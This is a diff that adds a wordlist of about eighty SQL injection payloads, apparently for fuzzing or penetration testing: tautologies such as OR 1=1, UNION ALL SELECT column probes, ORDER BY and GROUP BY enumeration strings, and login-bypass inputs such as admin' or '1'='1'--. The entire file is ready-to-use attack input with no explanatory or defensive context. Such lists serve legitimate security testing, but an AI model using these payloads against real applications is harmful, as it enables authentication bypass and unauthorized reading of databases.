@@ -1,0 +1,80 @@
+
+OR 1=1
+OR 1=1#
+OR 1=1-- 
+1 or 1 = 1
+WHERE 1=1 AND 1=1
+UNION ALL SELECT 1-- 
+UNION ALL SELECT 1,2-- 
+UNION ALL SELECT 1,2,3-- 
+UNION ALL SELECT 1,2,3,4-- 
+UNION ALL SELECT 1,2,3,4,5-- 
+' or "
+-- or # 
+' OR '1
+' OR 1 -- -
+" OR "" = "
+" OR 1 = 1 -- -
+' OR '' = '
+1' ORDER BY 1--+
+1' ORDER BY 2--+
+1' ORDER BY 1,2--+
+1' ORDER BY 1,2,3--+
+1' GROUP BY 1,2,3,4--+
+' GROUP BY columnnames having 1=1 --
+'-'
+'&'
+'^'
+'*'
+' or ''-'
+' or '' '
+' or ''&'
+' or ''^'
+' or ''*'
+" or ""-"
+" or "" "
+" or ""&"
+" or ""^"
+" or ""*"
+or true--
+" or true--
+' or true--
+") or true--
+') or true--
+') or ('x')=('x
+')) or (('x'))=(('x
+" or "x"="x
+") or ("x")=("x
+")) or (("x"))=(("x
+or 1=1--
+or 1=1#
+or 1=1/*
+admin' --
+administrator'--
+admin' #
+admin'/*
+admin' or '1'='1
+admin' or '1'='1'--
+admin' or '1'='1'#
+admin' or '1'='1'/*
+admin'or 1=1 or ''='
+admin' or 1=1
+admin' or 1=1--
+admin' or 1=1/*
+admin') or ('1'='1'--
+admin') or ('1'='1'#
+admin') or ('1'='1'/*
+admin') or '1'='1'--
+admin') or '1'='1'#
+admin') or '1'='1'/*
+admin" or "1"="1"--
+admin" or "1"="1"#
+admin" or "1"="1"/*
+admin"or 1=1 or ""="
+admin" or 1=1
+admin" or 1=1--
+admin") or ("1"="1"#
+admin") or ("1"="1"/*
+admin") or "1"="1"--
+admin") or "1"="1"#
+admin") or "1"="1"/*
